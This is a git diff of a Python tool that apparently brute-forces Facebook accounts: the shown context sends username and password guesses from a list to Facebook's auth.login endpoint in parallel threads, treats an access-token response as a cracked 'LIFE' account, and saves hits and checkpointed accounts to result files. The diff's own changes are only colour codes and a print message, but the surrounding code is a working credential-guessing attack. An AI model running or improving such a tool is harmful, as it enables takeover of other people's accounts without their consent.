@@ -25,6 +25,7 @@ g = '\x1b[1;32m'
 w = '\x1b[1;37m'
 b = '\x1b[1;36m'
 r = '\x1b[1;31m'
+y = '\x1b[33m'
 
 def masuk():
         logo.banner()
@@ -71,7 +72,7 @@ def login(username,password,cek=False):
         api = 'https://b-api.facebook.com/method/auth.login'
         response = requests.get(api, params=params)
         if 'EAA' in response.text:
-                print(f"\r[\033[1;91mLIFE\033[0m] {username} => {password}                    ",end="")
+                print(f"\r[\x1b[1;32mLIFE\033[0m] {username} => {password}                    ",end="")
                 print()
                 result += 1
                 if cek:
@@ -255,7 +256,7 @@ if __name__ == '__main__':
                                         for passw in set(listpass):
                                                 ex.submit(login,(users[1]),(passw))
                 if check != 0 or result != 0:
-                        print("            \x1b[1;37m     Done lala. file saved in : ")
+                        print("         \n \x1b[33m     Done lala. file saved in : ")
                         print("            \x1b[1;32m   - life : results-life.txt")
                         print("            \x1b[1;31m  - checkpoint : results-check.txt")
                         exit("             \x1b[1;36m   # Tools author : Zafar Abbas")
